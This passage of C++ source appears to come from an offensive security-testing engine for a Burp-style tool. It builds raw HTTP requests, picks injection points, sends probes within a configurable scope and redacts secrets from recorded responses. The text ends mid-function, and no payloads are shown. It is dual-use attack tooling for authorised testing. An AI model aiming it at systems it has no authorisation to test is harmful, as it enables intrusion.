#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>

#ifdef small
#undef small
#endif

#include "server_attack_engine.hpp"

#include "../audit_http.hpp"
#include "../collaborator.hpp"
#include "../h2_editor.hpp"
#include "../insertion_points.hpp"
#include "../issue.hpp"
#include "../payload_library.hpp"
#include "../scanner_module.hpp"

#include "../../../../helpers/diag_log.hpp"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cctype>
#include <cstdint>
#include <exception>
#include <iomanip>
#include <map>
#include <mutex>
#include <optional>
#include <sstream>
#include <string>
#include <unordered_map>
#include <utility>
#include <vector>

namespace aida {
namespace burp {
namespace offensive {
namespace server_attack {

namespace {

using json = nlohmann::json;

constexpr uint64_t kMaxTimeoutMs = 120000;
constexpr uint64_t kDefaultTimeoutMs = 30000;
constexpr size_t kDefaultPayloadCap = 16;
constexpr size_t kMaxPayloadCap = 64;
constexpr size_t kPreviewLimit = 768;
constexpr size_t kMaxStoredResults = 128;

struct parsed_url_t
{
    std::string scheme;
    std::string host;
    uint16_t port = 80;
    std::string path;
    bool tls = false;
};

struct request_context_t
{
    std::string url;
    std::string method;
    parsed_url_t target;
    std::vector<uint8_t> raw_request;
    std::vector<insertion_point_t> insertion_points;
};

struct run_limits_t
{
    uint64_t timeout_ms = kDefaultTimeoutMs;
    uint64_t deadline_ms = 0;
    size_t max_payloads = kDefaultPayloadCap;
    bool scope_only = true;
    bool follow_redirects = false;
    size_t request_count = 0;
    size_t transport_failures = 0;
    bool deadline_hit = false;
};

struct stored_result_t
{
    std::string task_id;
    std::string action;
    std::string status;
    uint64_t started_ms = 0;
    uint64_t ended_ms = 0;
    json data = json::object();
};

struct state_t
{
    std::mutex mtx;
    std::unordered_map<std::string, stored_result_t> results;
    std::vector<std::string> order;
    std::string latest_task_id;
    std::atomic<uint64_t> next_id{1};
};

state_t& state()
{
    static state_t s;
    return s;
}

uint64_t now_ms()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count());
}

std::string lower_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return s;
}

std::string upper_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::toupper(c)); });
    return s;
}

bool ieq_ascii(const std::string& a, const std::string& b)
{
    if (a.size() != b.size()) return false;
    for (size_t i = 0; i < a.size(); ++i) {
        if (std::tolower(static_cast<unsigned char>(a[i])) != std::tolower(static_cast<unsigned char>(b[i])))
            return false;
    }
    return true;
}

std::string base36(uint64_t v)
{
    static const char chars[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    if (v == 0) return "0";
    std::string out;
    while (v != 0) {
        out.push_back(chars[v % 36]);
        v /= 36;
    }
    std::reverse(out.begin(), out.end());
    return out;
}

std::string make_task_id(const std::string& action)
{
    uint64_t id = state().next_id.fetch_add(1, std::memory_order_acq_rel);
    std::string compact;
    compact.reserve(action.size());
    for (char c : action) {
        if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) compact.push_back(c);
        else if (c == '_') compact.push_back('-');
    }
    if (compact.size() > 18) compact.resize(18);
    return "srv_" + compact + "_" + base36(now_ms()) + "_" + base36(id);
}

uint64_t fnv1a64(const uint8_t* data, size_t size)
{
    uint64_t h = 1469598103934665603ull;
    for (size_t i = 0; i < size; ++i) {
        h ^= static_cast<uint64_t>(data[i]);
        h *= 1099511628211ull;
    }
    return h;
}

uint64_t fnv1a64(const std::vector<uint8_t>& data)
{
    return data.empty() ? fnv1a64(reinterpret_cast<const uint8_t*>(""), 0) : fnv1a64(data.data(), data.size());
}

uint64_t fnv1a64(const std::string& text)
{
    return text.empty() ? fnv1a64(reinterpret_cast<const uint8_t*>(""), 0) :
        fnv1a64(reinterpret_cast<const uint8_t*>(text.data()), text.size());
}

std::string hex64(uint64_t value)
{
    std::ostringstream os;
    os << std::hex << std::setw(16) << std::setfill('0') << value;
    return os.str();
}

std::string hash_vector(const std::vector<uint8_t>& data)
{
    return hex64(fnv1a64(data));
}

std::string hash_text(const std::string& text)
{
    return hex64(fnv1a64(text));
}

bool json_string(const json& obj, const char* key, std::string& out)
{
    if (!obj.is_object() || !obj.contains(key) || !obj[key].is_string()) return false;
    out = obj[key].get<std::string>();
    return true;
}

std::string json_string_or(const json& obj, const char* key, const std::string& fallback)
{
    std::string out;
    return json_string(obj, key, out) ? out : fallback;
}

bool has_param_target(const json& obj)
{
    return obj.is_object() &&
           ((obj.contains("param_target") && obj["param_target"].is_string()) ||
            (obj.contains("param") && obj["param"].is_string()));
}

std::string param_target_or(const json& obj)
{
    const std::string param_target = json_string_or(obj, "param_target", "");
    if (!param_target.empty()) return param_target;
    return json_string_or(obj, "param", "");
}

bool json_bool_or(const json& obj, const char* key, bool fallback)
{
    if (!obj.is_object() || !obj.contains(key) || !obj[key].is_boolean()) return fallback;
    return obj[key].get<bool>();
}

uint64_t json_u64_or(const json& obj, const char* key, uint64_t fallback, uint64_t min_value, uint64_t max_value)
{
    if (!obj.is_object() || !obj.contains(key)) return fallback;
    uint64_t value = fallback;
    try {
        if (obj[key].is_number_unsigned()) value = obj[key].get<uint64_t>();
        else if (obj[key].is_number_integer()) {
            const int64_t signed_value = obj[key].get<int64_t>();
            if (signed_value < 0) value = min_value;
            else value = static_cast<uint64_t>(signed_value);
        } else if (obj[key].is_number_float()) {
            const double d = obj[key].get<double>();
            if (d < 0.0) value = min_value;
            else value = static_cast<uint64_t>(d);
        }
    } catch (...) {
        value = fallback;
    }
    return (std::min)(max_value, (std::max)(min_value, value));
}

std::vector<std::string> json_string_array(const json& obj, const char* key)
{
    std::vector<std::string> out;
    if (!obj.is_object() || !obj.contains(key)) return out;
    const json& v = obj[key];
    if (v.is_string()) {
        out.push_back(v.get<std::string>());
        return out;
    }
    if (!v.is_array()) return out;
    for (const auto& item : v) {
        if (item.is_string())
            out.push_back(item.get<std::string>());
    }
    return out;
}

std::string json_scalar_to_string(const json& v)
{
    if (v.is_string()) return v.get<std::string>();
    if (v.is_boolean()) return v.get<bool>() ? "true" : "false";
    if (v.is_number_integer()) return std::to_string(v.get<int64_t>());
    if (v.is_number_unsigned()) return std::to_string(v.get<uint64_t>());
    if (v.is_number_float()) {
        std::ostringstream os;
        os << v.get<double>();
        return os.str();
    }
    if (v.is_null()) return "null";
    return v.dump();
}

std::string header_safe(std::string text)
{
    for (char& c : text) {
        const unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc == 0x7f) c = ' ';
    }
    return text;
}

bool header_name_eq(const std::string& name, const char* expected)
{
    return ieq_ascii(name, expected ? std::string(expected) : std::string());
}

bool parse_url_local(const std::string& input, parsed_url_t& out)
{
    if (input.empty()) return false;
    std::string url = input;
    size_t sep = url.find("://");
    size_t start = 0;
    if (sep == std::string::npos) {
        out.scheme = "http";
    } else {
        out.scheme = lower_ascii(url.substr(0, sep));
        start = sep + 3;
    }
    if (out.scheme != "http" && out.scheme != "https") return false;
    const size_t path_pos = url.find_first_of("/?", start);
    std::string authority = path_pos == std::string::npos ? url.substr(start) : url.substr(start, path_pos - start);
    const size_t at = authority.rfind('@');
    if (at != std::string::npos) authority = authority.substr(at + 1);
    if (authority.empty()) return false;
    out.tls = out.scheme == "https";
    out.port = out.tls ? 443 : 80;
    if (!authority.empty() && authority.front() == '[') {
        const size_t close = authority.find(']');
        if (close == std::string::npos) return false;
        out.host = authority.substr(0, close + 1);
        if (close + 1 < authority.size()) {
            if (authority[close + 1] != ':') return false;
            try {
                const unsigned long parsed = std::stoul(authority.substr(close + 2));
                if (parsed == 0 || parsed > 65535) return false;
                out.port = static_cast<uint16_t>(parsed);
            } catch (...) {
                return false;
            }
        }
    } else {
        const size_t colon = authority.rfind(':');
        if (colon == std::string::npos) {
            out.host = authority;
        } else {
            out.host = authority.substr(0, colon);
            try {
                const unsigned long parsed = std::stoul(authority.substr(colon + 1));
                if (parsed == 0 || parsed > 65535) return false;
                out.port = static_cast<uint16_t>(parsed);
            } catch (...) {
                return false;
            }
        }
    }
    if (out.host.empty()) return false;
    out.path = path_pos == std::string::npos ? "/" : url.substr(path_pos);
    if (out.path.empty()) out.path = "/";
    if (out.path.front() == '?') out.path.insert(out.path.begin(), '/');
    return true;
}

std::string host_header_value(const parsed_url_t& target)
{
    std::string host = target.host;
    const bool default_port = (target.tls && target.port == 443) || (!target.tls && target.port == 80);
    if (!default_port) {
        host += ":";
        host += std::to_string(target.port);
    }
    return host;
}

std::string path_without_query(const std::string& path)
{
    const size_t q = path.find('?');
    return q == std::string::npos ? path : path.substr(0, q);
}

std::vector<uint8_t> base64_decode(const std::string& s)
{
    static const int8_t table[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
    };
    std::vector<uint8_t> out;
    out.reserve((s.size() / 4) * 3);
    uint32_t val = 0;
    int bits = 0;
    for (unsigned char c : s) {
        if (c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;
        const int8_t v = table[c];
        if (v == -2) break;
        if (v < 0) return std::vector<uint8_t>();
        val = (val << 6) | static_cast<uint32_t>(v);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<uint8_t>((val >> bits) & 0xff));
        }
    }
    return out;
}

bool has_header(const std::vector<std::pair<std::string, std::string>>& headers, const char* name)
{
    for (const auto& h : headers) {
        if (header_name_eq(h.first, name)) return true;
    }
    return false;
}

bool parse_headers_json(const json& params, std::vector<std::pair<std::string, std::string>>& headers, std::string& err)
{
    if (!params.is_object() || !params.contains("headers")) return true;
    json parsed;
    const json* src = &params["headers"];
    if (src->is_string()) {
        const std::string text = src->get<std::string>();
        try {
            parsed = json::parse(text);
            src = &parsed;
        } catch (...) {
            size_t p = 0;
            while (p < text.size()) {
                size_t eol = text.find('\n', p);
                if (eol == std::string::npos) eol = text.size();
                std::string line = text.substr(p, eol - p);
                while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
                size_t colon = line.find(':');
                if (colon != std::string::npos && colon > 0)
                    headers.emplace_back(line.substr(0, colon), line.substr(colon + 1));
                if (eol == text.size()) break;
                p = eol + 1;
            }
            return true;
        }
    }
    if (src->is_object()) {
        for (auto it = src->begin(); it != src->end(); ++it) {
            headers.emplace_back(it.key(), json_scalar_to_string(it.value()));
        }
        return true;
    }
    if (src->is_array()) {
        for (const auto& item : *src) {
            if (item.is_array() && item.size() == 2) {
                headers.emplace_back(json_scalar_to_string(item[0]), json_scalar_to_string(item[1]));
            } else if (item.is_object() && item.contains("name") && item.contains("value")) {
                headers.emplace_back(json_scalar_to_string(item["name"]), json_scalar_to_string(item["value"]));
            } else {
                err = "headers entries must be [name,value] or {name,value}";
                return false;
            }
        }
        return true;
    }
    err = "headers must be object, array, JSON string, or newline header string";
    return false;
}

std::string merge_query_param(const std::string& path, const std::string& key, const std::string& value)
{
    std::string out = path.empty() ? "/" : path;
    out += out.find('?') == std::string::npos ? '?' : '&';
    out += insertion_points::url_encode(key);
    out += '=';
    out += insertion_points::url_encode(value);
    return out;
}

bool request_mentions_param(const std::string& path, const std::string& body, const std::string& param)
{
    if (param.empty()) return true;
    const std::string enc = insertion_points::url_encode(param);
    if (path.find(param + "=") != std::string::npos || path.find(enc + "=") != std::string::npos) return true;
    if (body.find(param + "=") != std::string::npos || body.find("\"" + param + "\"") != std::string::npos) return true;
    return false;
}

bool is_body_method(const std::string& method)
{
    return method == "POST" || method == "PUT" || method == "PATCH";
}

std::string params_to_form(const json& params)
{
    std::string body;
    if (!params.is_object()) return body;
    for (auto it = params.begin(); it != params.end(); ++it) {
        if (!body.empty()) body += '&';
        body += insertion_points::url_encode(it.key());
        body += '=';
        body += insertion_points::url_encode(json_scalar_to_string(it.value()));
    }
    return body;
}

json params_json_object(const json& params)
{
    if (params.is_object()) return params;
    return json::object();
}

std::vector<uint8_t> make_raw_request(const parsed_url_t& target,
                                      const std::string& method,
                                      const std::string& content_type,
                                      const std::vector<std::pair<std::string, std::string>>& headers,
                                      const std::string& body)
{
    std::string req;
    req.reserve(method.size() + target.path.size() + body.size() + 512);
    req += method;
    req += ' ';
    req += target.path.empty() ? "/" : target.path;
    req += " HTTP/1.1\r\nHost: ";
    req += header_safe(host_header_value(target));
    req += "\r\nUser-Agent: AiDA-Offensive-ServerAttack/1.0\r\nAccept: */*\r\nAccept-Encoding: identity\r\n";
    bool emitted_content_type = false;
    for (const auto& h : headers) {
        if (h.first.empty()) continue;
        if (header_name_eq(h.first, "Host") || header_name_eq(h.first, "Content-Length") || header_name_eq(h.first, "Connection")) continue;
        if (header_name_eq(h.first, "Content-Type")) emitted_content_type = true;
        req += header_safe(h.first);
        req += ": ";
        req += header_safe(h.second);
        req += "\r\n";
    }
    if (!body.empty() || is_body_method(method)) {
        if (!emitted_content_type) {
            req += "Content-Type: ";
            req += content_type.empty() ? "application/x-www-form-urlencoded" : header_safe(content_type);
            req += "\r\n";
        }
        req += "Content-Length: ";
        req += std::to_string(body.size());
        req += "\r\n";
    }
    req += "Connection: close\r\n\r\n";
    req.append(body.data(), body.size());
    return std::vector<uint8_t>(req.begin(), req.end());
}

std::optional<request_context_t> build_request_context(const json& params,
                                                       const std::string& default_method,
                                                       const std::string& default_content_type,
                                                       bool require_target_param,
                                                       std::string& err)
{
    std::string url;
    if (!json_string(params, "url", url)) {
        err = "url required";
        return std::nullopt;
    }
    request_context_t ctx;
    ctx.url = url;
    if (!parse_url_local(url, ctx.target)) {
        err = "invalid url";
        return std::nullopt;
    }
    ctx.method = upper_ascii(json_string_or(params, "method", default_method.empty() ? "GET" : default_method));
    if (ctx.method.empty()) ctx.method = "GET";
    std::string param_target = param_target_or(params);
    std::string content_type = json_string_or(params, "content_type", default_content_type);
    std::vector<std::pair<std::string, std::string>> headers;
    if (!parse_headers_json(params, headers, err)) return std::nullopt;
    if (content_type.empty() && has_header(headers, "Content-Type")) content_type = default_content_type;

    std::string body;
    if (params.contains("body_b64") && params["body_b64"].is_string()) {
        auto decoded = base64_decode(params["body_b64"].get<std::string>());
        if (decoded.empty() && !params["body_b64"].get<std::string>().empty()) {
            err = "body_b64 invalid";
            return std::nullopt;
        }
        body.assign(reinterpret_cast<const char*>(decoded.data()), decoded.size());
    } else if (params.contains("body") && params["body"].is_string()) {
        body = params["body"].get<std::string>();
    } else if (params.contains("xml_body") && params["xml_body"].is_string()) {
        body = params["xml_body"].get<std::string>();
        if (content_type.empty()) content_type = "application/xml";
    }

    const bool explicit_body = !body.empty();
    if (!explicit_body && params.contains("params") && params["params"].is_object()) {
        if (is_body_method(ctx.method)) {
            if (content_type.find("json") != std::string::npos) body = params_json_object(params["params"]).dump();
            else body = params_to_form(params["params"]);
        } else {
            for (auto it = params["params"].begin(); it != params["params"].end(); ++it)
                ctx.target.path = merge_query_param(ctx.target.path, it.key(), json_scalar_to_string(it.value()));
        }
    }
    if (require_target_param && !param_target.empty() && !request_mentions_param(ctx.target.path, body, param_target)) {
        if (is_body_method(ctx.method)) {
            if (content_type.find("json") != std::string::npos) {
                json doc = json::object();
                if (!body.empty()) {
                    try { doc = json::parse(body); } catch (...) { doc = json::object(); }
                }
                doc[param_target] = "aida";
                body = doc.dump();
            } else {
                if (!body.empty()) body += '&';
                body += insertion_points::url_encode(param_target);
                body += "=aida";
                if (content_type.empty()) content_type = "application/x-www-form-urlencoded";
            }
        } else {
            ctx.target.path = merge_query_param(ctx.target.path, param_target, "aida");
        }
    }
    if (is_body_method(ctx.method) && content_type.empty()) content_type = "application/x-www-form-urlencoded";
    ctx.raw_request = make_raw_request(ctx.target, ctx.method, content_type, headers, body);
    ctx.insertion_points = insertion_points::analyze(ctx.raw_request, ctx.url);
    return ctx;
}

std::vector<uint8_t> replace_request_body(const std::vector<uint8_t>& raw, const std::string& new_body)
{
    std::string request(reinterpret_cast<const char*>(raw.data()), raw.size());
    const size_t split = request.find("\r\n\r\n");
    if (split == std::string::npos) return raw;
    std::string head = request.substr(0, split + 4);
    std::string lower = lower_ascii(head);
    const size_t cl = lower.find("content-length:");
    if (cl != std::string::npos) {
        const size_t value_start = head.find(':', cl) + 1;
        size_t value_end = head.find("\r\n", value_start);
        std::string replacement = " " + std::to_string(new_body.size());
        head = head.substr(0, value_start) + replacement + head.substr(value_end);
    } else {
        head.insert(split, "Content-Length: " + std::to_string(new_body.size()) + "\r\n");
    }
    std::string out = head;
    out.append(new_body.data(), new_body.size());
    return std::vector<uint8_t>(out.begin(), out.end());
}

insertion_point_t whole_body_insertion_point(const request_context_t& ctx, const std::string& name)
{
    insertion_point_t ip;
    ip.kind = "body_raw";
    ip.name = name.empty() ? "body" : name;
    ip.base_request.assign(reinterpret_cast<const char*>(ctx.raw_request.data()), ctx.raw_request.size());
    ip.original_value.clear();
    ip.value_offset = 0;
    ip.value_length = 0;
    ip.build = [raw = ctx.raw_request](const std::string& injected) {
        return replace_request_body(raw, injected);
    };
    return ip;
}

bool insertion_point_matches(const insertion_point_t& ip, const std::string& param)
{
    if (param.empty()) return false;
    if (ip.name == param) return true;
    if (insertion_points::url_decode(ip.name) == param) return true;
    if (!ip.name.empty() && ip.name.front() == '/') {
        const size_t slash = ip.name.find_last_of('/');
        if (slash != std::string::npos && ip.name.substr(slash + 1) == param) return true;
    }
    return false;
}

std::optional<insertion_point_t> select_insertion_point(const request_context_t& ctx,
                                                       const std::string& param,
                                                       bool allow_any)
{
    if (!param.empty()) {
        for (const auto& ip : ctx.insertion_points) {
            if (insertion_point_matches(ip, param)) return ip;
        }
    }
    if (!allow_any) return std::nullopt;
    static const char* preferred[] = {"query", "body_form", "body_json", "body_xml", "header", "cookie", "path"};
    for (const char* kind : preferred) {
        for (const auto& ip : ctx.insertion_points) {
            if (ip.kind == kind) return ip;
        }
    }
    if (!ctx.insertion_points.empty()) return ctx.insertion_points.front();
    return std::nullopt;
}

bool sensitive_key(const std::string& key)
{
    const std::string k = lower_ascii(key);
    return k.find("secret") != std::string::npos ||
           k.find("token") != std::string::npos ||
           k.find("password") != std::string::npos ||
           k.find("passwd") != std::string::npos ||
           k.find("credential") != std::string::npos ||
           k.find("authorization") != std::string::npos ||
           k.find("private") != std::string::npos ||
           k.find("api_key") != std::string::npos ||
           k.find("apikey") != std::string::npos ||
           k.find("accesskey") != std::string::npos ||
           k.find("access_key") != std::string::npos ||
           k.find("license") != std::string::npos ||
           k.find("session") != std::string::npos;
}

json sanitize_json_value(const json& in, const std::string& key, size_t& redactions)
{
    if (sensitive_key(key)) {
        ++redactions;
        if (in.is_string()) {
            const std::string value = in.get<std::string>();
            return "[REDACTED len=" + std::to_string(value.size()) + " hash=" + hash_text(value) + "]";
        }
        return "[REDACTED]";
    }
    if (in.is_object()) {
        json out = json::object();
        for (auto it = in.begin(); it != in.end(); ++it) out[it.key()] = sanitize_json_value(it.value(), it.key(), redactions);
        return out;
    }
    if (in.is_array()) {
        json out = json::array();
        for (const auto& item : in) out.push_back(sanitize_json_value(item, key, redactions));
        return out;
    }
    return in;
}

std::string printable_preview(const std::vector<uint8_t>& body, size_t limit)
{
    const size_t n = (std::min)(body.size(), limit);
    std::string text;
    text.reserve(n);
    for (size_t i = 0; i < n; ++i) {
        const unsigned char c = body[i];
        if (c == '\r' || c == '\n' || c == '\t') text.push_back(static_cast<char>(c));
        else if (c >= 0x20 && c < 0x7f) text.push_back(static_cast<char>(c));
        else text.push_back('.');
    }
    return text;
}

std::string redact_sensitive_lines(const std::string& in, size_t& redactions)
{
    std::istringstream stream(in);
    std::string line;
    std::string out;
    bool first = true;
    while (std::getline(stream, line)) {
        std::string lc = lower_ascii(line);
        bool redact = sensitive_key(lc) || lc.find("bearer ") != std::string::npos ||
                      lc.find("akia") != std::string::npos || lc.find("asia") != std::string::npos ||
                      lc.find("-----begin") != std::string::npos;
        if (!first) out += '\n';
        first = false;
        if (redact) {
            ++redactions;
            size_t keep = line.find_first_of(":=");
            if (keep == std::string::npos || keep > 96) keep = 0;
            else ++keep;
            out += line.substr(0, keep);
            out += "[REDACTED len=";
            out += std::to_string(line.size() > keep ? line.size() - keep : line.size());
            out += " hash=";
            out += hash_text(line);
            out += "]";
        } else {
            out += line;
        }
    }
    return out;
}

std::string redact_exact_values(std::string text, const std::vector<std::string>& exact_values, size_t& redactions)
{
    for (const auto& value : exact_values) {
        if (value.size() < 6) continue;
        const std::string repl = "[REDACTED len=" + std::to_string(value.size()) + " hash=" + hash_text(value) + "]";
        size_t pos = 0;
        while ((pos = text.find(value, pos)) != std::string::npos) {
            text.replace(pos, value.size(), repl);
            pos += repl.size();
            ++redactions;
        }
    }
    return text;
}

std::string redacted_text(const std::string& text,
                          size_t& redactions,
                          const std::vector<std::string>& exact_values = {})
{
    if (text.empty()) return text;
    try {
        json parsed = json::parse(text);
        json sanitized = sanitize_json_value(parsed, "", redactions);
        std::string dumped = sanitized.dump();
        if (dumped.size() > kPreviewLimit) dumped.resize(kPreviewLimit);
        return redact_exact_values(std::move(dumped), exact_values, redactions);
    } catch (...) {
    }
    std::string limited = text;
    if (limited.size() > kPreviewLimit) limited.resize(kPreviewLimit);
    return redact_exact_values(redact_sensitive_lines(limited, redactions), exact_values, redactions);
}

json response_summary(const exchange_observed_t& ex, const std::vector<std::string>& exact_redactions = {})
{
    json out;
    out["exchange_id"] = ex.id;
    out["status_code"] = ex.status_code;
    out["reason"] = ex.reason_phrase;
    out["latency_ms"] = ex.latency_ms;
    out["body_size"] = ex.resp_body.size();
    out["body_hash"] = hash_vector(ex.resp_body);
    size_t redactions = 0;
    const std::string preview = redacted_text(printable_preview(ex.resp_body, kPreviewLimit), redactions, exact_redactions);
    out["body_preview"] = preview;
    out["body_preview_truncated"] = ex.resp_body.size() > kPreviewLimit;
    out["sensitive_redactions"] = redactions;
    json header_names = json::array();
    for (const auto& h : ex.resp_headers) header_names.push_back(h.first);
    out["response_header_names"] = std::move(header_names);
    return out;
}

json h2_response_summary(const h2_editor::response_t& r, const std::vector<std::string>& exact_redactions = {})
{
    json out;
    out["ok"] = r.ok;
    out["status_code"] = r.status_code;
    out["latency_ms"] = r.latency_ms;
    out["error"] = r.error_msg;
    out["body_size"] = r.body.size();
    out["body_hash"] = hash_vector(r.body);
    size_t redactions = 0;
    out["body_preview"] = redacted_text(printable_preview(r.body, kPreviewLimit), redactions, exact_redactions);
    out["sensitive_redactions"] = redactions;
    return out;
}

json response_delta(const std::optional<exchange_observed_t>& baseline, const exchange_observed_t& probe)
{
    json out;
    if (!baseline.has_value()) {
        out["baseline_known"] = false;
        return out;
    }
    out["baseline_known"] = true;
    out["baseline_status"] = baseline->status_code;
    out["probe_status"] = probe.status_code;
    out["status_changed"] = baseline->status_code != probe.status_code;
    out["baseline_body_size"] = baseline->resp_body.size();
    out["probe_body_size"] = probe.resp_body.size();
    out["body_size_delta"] = baseline->resp_body.size() > probe.resp_body.size()
        ? baseline->resp_body.size() - probe.resp_body.size()
        : probe.resp_body.size() - baseline->resp_body.size();
    out["baseline_body_hash"] = hash_vector(baseline->resp_body);
    out["probe_body_hash"] = hash_vector(probe.resp_body);
    out["body_hash_changed"] = fnv1a64(baseline->resp_body) != fnv1a64(probe.resp_body);
    out["baseline_latency_ms"] = baseline->latency_ms;
    out["probe_latency_ms"] = probe.latency_ms;
    out["latency_delta_ms"] = probe.latency_ms > baseline->latency_ms
        ? probe.latency_ms - baseline->latency_ms
        : 0;
    return out;
}

std::string sanitized_evidence_text(const json& summary)
{
    std::string text = summary.dump();
    if (text.size() > 4096) text.resize(4096);
    return text;
}

issue_t make_sanitized_issue(const std::string& type_key,
                             const std::string& name,
                             severity_t severity,
                             confidence_t confidence,
                             const request_context_t& ctx,
                             const insertion_point_t& ip,
                             const std::optional<exchange_observed_t>& ex,
                             const std::string& description,
                             const std::string& remediation,
                             const std::vector<std::string>& cwe,
                             const json& evidence,
                             const std::vector<std::string>& exact_redactions = {})
{
    issue_t issue;
    issue.type_key = type_key;
    issue.name = name;
    issue.severity = severity;
    issue.confidence = confidence;
    issue.scheme = ctx.target.scheme;
    issue.host = ctx.target.host;
    issue.port = ctx.target.port;
    issue.path = ex.has_value() && !ex->path.empty() ? ex->path : path_without_query(ctx.target.path);
    issue.parameter = ip.name;
    issue.insertion_point = ip.kind + (ip.name.empty() ? std::string() : ":" + ip.name);
    issue.description = description;
    issue.remediation = remediation;
    issue.cwe = cwe;
    issue.seen_ms = now_ms();
    issue.src_exchange_id = ex.has_value() ? ex->id : 0;
    evidence_t ev;
    ev.request_raw = "request_len=" + std::to_string(ctx.raw_request.size()) + " request_hash=" + hash_vector(ctx.raw_request) +
                     " insertion_point=" + issue.insertion_point;
    if (ex.has_value()) {
        json r = response_summary(*ex, exact_redactions);
        ev.response_raw = sanitized_evidence_text(r);
    } else {
        ev.response_raw = "no_response";
    }
    ev.marker = sanitized_evidence_text(evidence);
    issue.evidence.push_back(std::move(ev));
    return issue;
}

uint64_t add_issue(issue_t issue)
{
    issue_store::initialize();
    return issue_store::add(std::move(issue));
}

void sanitize_module_issue(issue_t& issue,
                           const request_context_t& ctx,
                           const insertion_point_t& ip,
                           const exchange_observed_t& ex,
                           const scanner::probe_t& probe,
                           const json& evidence)
{
    issue.scheme = ctx.target.scheme;
    issue.host = ctx.target.host;
    issue.port = ctx.target.port;
    if (issue.path.empty()) issue.path = ex.path.empty() ? path_without_query(ctx.target.path) : ex.path;
    issue.parameter = ip.name;
    issue.insertion_point = ip.kind + (ip.name.empty() ? std::string() : ":" + ip.name);
    issue.src_exchange_id = ex.id;
    issue.evidence.clear();
    evidence_t ev;
    ev.request_raw = "request_len=" + std::to_string(ctx.raw_request.size()) + " request_hash=" + hash_vector(ctx.raw_request) +
                     " payload_len=" + std::to_string(probe.payload.size()) + " payload_hash=" + hash_text(probe.payload) +
                     " variant=" + probe.variant;
    ev.response_raw = sanitized_evidence_text(response_summary(ex, {probe.payload, probe.marker}));
    ev.marker = sanitized_evidence_text(evidence);
    issue.evidence.push_back(std::move(ev));
}

std::optional<exchange_observed_t> send_request(const request_context_t& ctx,
                                                const std::vector<uint8_t>& raw,
                                                run_limits_t& limits,
                                                const char* phase,
                                                json* send_error)
{
    if (now_ms() >= limits.deadline_ms) {
        limits.deadline_hit = true;
        if (send_error) (*send_error)["error"] = "deadline reached before request";
        return std::nullopt;
    }
    audit_http::send_options_t opt;
    opt.timeout_ms = static_cast<int>((std::min<uint64_t>)(limits.timeout_ms, kMaxTimeoutMs));
    opt.follow_redirects = limits.follow_redirects;
    opt.return_first_redirect = true;
    opt.enforce_scope = limits.scope_only;
    opt.publish_exchange = true;
    opt.exchange_source = "offensive_server_attack";
    ++limits.request_count;
    const uint64_t start = now_ms();
    auto observed = audit_http::send(raw, ctx.target.host, ctx.target.port, ctx.target.tls, opt);
    const uint64_t elapsed = now_ms() - start;
    if (!observed.has_value()) {
        ++limits.transport_failures;
        if (send_error) {
            (*send_error)["phase"] = phase ? phase : "probe";
            (*send_error)["elapsed_ms"] = elapsed;
            (*send_error)["transport_error"] = audit_http::last_error();
        }
    }
    return observed;
}

std::optional<exchange_observed_t> send_baseline(const request_context_t& ctx, run_limits_t& limits, json& out)
{
    json err = json::object();
    auto baseline = send_request(ctx, ctx.raw_request, limits, "baseline", &err);
    if (baseline.has_value()) {
        out["baseline"] = response_summary(*baseline);
    } else {
        out["baseline_error"] = err;
    }
    return baseline;
}

scanner::module_context_t make_module_context(const request_context_t& ctx,
                                              const std::optional<exchange_observed_t>& baseline,
                                              run_limits_t& limits)
{
    scanner::module_context_t mctx;
    mctx.url = ctx.url;
    mctx.host = ctx.target.host;
    mctx.port = ctx.target.port;
    mctx.tls = ctx.target.tls;
    mctx.timeout_ms = static_cast<int>(limits.timeout_ms);
    mctx.follow_redirects = limits.follow_redirects;
    mctx.cancelled = [&limits]() {
        return now_ms() >= limits.deadline_ms;
    };
    if (baseline.has_value()) {
        mctx.baseline_latency_ms = baseline->latency_ms;
        mctx.baseline_response_body = baseline->resp_body;
        mctx.baseline_response_headers = baseline->resp_headers;
        mctx.baseline_status_code = baseline->status_code;
    }
    return mctx;
}

std::vector<scanner::probe_t> payload_entries_as_probes(const std::string& set_id, const std::string& variant, size_t max_count)
{
    std::vector<scanner::probe_t> out;
    payloads::initialize();
    auto entries = payloads::entries(set_id, max_count);
